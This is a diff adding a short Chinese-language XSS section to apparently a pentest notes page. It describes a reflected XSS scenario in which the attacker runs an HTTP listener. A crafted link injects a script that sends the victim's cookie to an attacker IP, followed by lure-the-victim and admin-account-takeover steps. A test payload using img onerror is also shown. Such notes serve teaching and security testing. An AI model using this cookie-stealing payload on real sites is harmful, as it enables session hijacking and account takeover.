@@ -19,6 +19,23 @@
 
 ## XSS
 
+### 受害场景
+
+XSRF, 以受害者的身份发送请求, **如果受害者是管理员, 可利用创建一个新的管理员帐号供攻击者使用**
+
+#### 反射型
+
+1. 攻击者启动一个http服务器：`python -m SimpleHTTPServer 88`
+1. 攻击者构造超链接, 请求 {==URL参数==} 中注入XSS脚本, 如: `http://xxx.com/xxx.action?provider=wiseus&{==query=<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>==}&device=mobile&ssid=0&from=844b&uid=0`
+1. **诱骗受害者点击该链接**
+1. XSS脚本读取Cookies中的SESSIONID(**未设置httponly**), 并将其发送给攻击者
+
+#### 存储型
+
+#### DOM型
+
+---
+
 1. 尝试使用`xss"><img src=x onerror=alert(3)>`
 
 ???+ tip
